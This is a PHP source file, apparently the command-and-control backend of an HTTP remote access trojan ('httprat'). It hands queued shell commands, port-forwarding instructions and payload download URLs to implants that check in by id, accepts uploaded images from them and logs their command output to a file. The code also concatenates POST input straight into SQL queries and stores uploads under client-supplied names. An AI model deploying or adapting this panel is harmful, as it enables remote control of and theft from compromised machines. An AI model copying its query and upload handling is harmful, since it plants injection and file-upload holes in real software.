<?php

require("config.php");

error_reporting(E_ALL ^ E_NOTICE);//显示除去 E_NOTICE 之外的所有错误信息

$mysqli = new mysqli($dbaddr,$username,$password,$dbname);
if(mysqli_connect_error())
{
	printf("数据库连接失败：%s\n",mysqli_connect_error());
	exit();
}

	
//当server将id以POST方式提交到Web时，将id放到数据库中查询，并将命令返回给server	
if (($_POST["ver"]!=NULL)&&($_POST["id"] != NULL)&&($_POST["type"]=='shell'))
{
	$idout = $_POST["id"];
	$result = $mysqli->query("SELECT shell FROM httprat WHERE id = '$idout'");
	$row = $result->fetch_assoc();
	printf("%s%s","REP",$row["shell"]) ;
	$time = date("Y-n-j H:i:s");
	$mysqli->query("UPDATE status SET shellLT = '$time' WHERE id = '$idout'");	
	$mysqli->query("UPDATE httprat SET shell = 'donothing' WHERE id = '$idout'"); 

	$result->close();
}

if (($_POST["ver"]!=NULL)&&($_POST["id"] != NULL)&&($_POST["type"]=='tran'))
{
	$idout = $_POST["id"];
	$result = $mysqli->query("SELECT ports FROM httprat WHERE id = '$idout'");
	$row = $result->fetch_assoc();
	printf("%s%s","REP",$row["ports"]) ;
	$time = date("Y-n-j H:i:s");
	$mysqli->query("UPDATE status SET tranLT = '$time' WHERE id = '$idout'");
	$mysqli->query("UPDATE httprat SET ports = 'donothing' WHERE id = '$idout'"); 
	$result->close();
}


if (($_POST["ver"]!=NULL)&&($_POST["id"] != NULL)&&($_POST["type"]=='download'))
{
	$idout = $_POST["id"];
	$result = $mysqli->query("SELECT * FROM httprat WHERE id = '$idout'");
	$row = $result->fetch_assoc();
	printf("%s%s^%s","REP",$row["url"],$row["filename"]) ;
	
	$mysqli->query("UPDATE httprat SET url = 'donothing' WHERE id = '$idout'"); 
	$mysqli->query("UPDATE httprat SET filename = 'donothing' WHERE id = '$idout'"); 

	$result->close();
}


if (($_FILES["file"]["type"] == "image/gif")
|| ($_FILES["file"]["type"] == "image/jpeg")
|| ($_FILES["file"]["type"] == "image/pjpeg"))
{
	if ($_FILES["file"]["error"] > 0)
	{
		echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
	}
	else
	{
		echo "Upload: " . $_FILES["file"]["name"] . "<br />";
		echo "Type: " . $_FILES["file"]["type"] . "<br />";
		echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
		echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";

		if (file_exists("upload/" . $_FILES["file"]["name"]))
			{
				unlink("upload/" . $_FILES["file"]["name"]);
			}

			{
				move_uploaded_file($_FILES["file"]["tmp_name"],
				"upload/" . $_FILES["file"]["name"]);
				echo "Stored in: " . "upload/" . $_FILES["file"]["name"];
			}
	}
}

//将命令回显写入文件

if($_POST["output"]!=NULL)
{
	$output = $_POST["output"];
	$handle1 = fopen("output.txt","a+");
	fwrite($handle1,$output);
	fclose($handle1);
}
//清除回显


$mysqli->close();

?>